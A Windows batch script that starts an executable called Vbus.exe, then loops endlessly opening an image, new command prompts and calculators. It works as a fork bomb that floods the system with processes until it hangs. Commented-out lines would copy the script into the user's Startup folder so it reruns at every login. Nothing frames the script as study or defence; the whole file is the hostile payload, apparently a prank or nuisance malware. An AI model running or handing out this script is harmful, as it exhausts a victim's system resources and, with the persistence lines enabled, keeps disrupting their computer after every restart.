@echo off

set exeFileName=Vbus.exe
set imageName=sup.png

rem set "source=%~f0"
rem set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem copy "%sourceFile%" "%startupFolder%"

start %exeFileName%

:a 

start %imageName%
start %windir%\system32\cmd.exe
start %windir%\system32\calc.exe

goto a 